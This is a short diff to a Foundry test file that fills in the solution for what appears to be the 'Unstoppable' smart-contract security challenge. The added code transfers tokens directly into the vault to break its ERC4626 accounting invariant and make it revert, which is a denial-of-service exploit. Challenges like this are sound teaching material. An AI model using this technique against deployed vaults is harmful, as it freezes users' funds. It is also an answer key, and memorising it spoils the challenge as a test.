@@ -91,7 +91,8 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        // Direct transfer of tokens inside the vault will trigger the ERC4626 invariant check and revert
+        token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);
     }
 
     /**
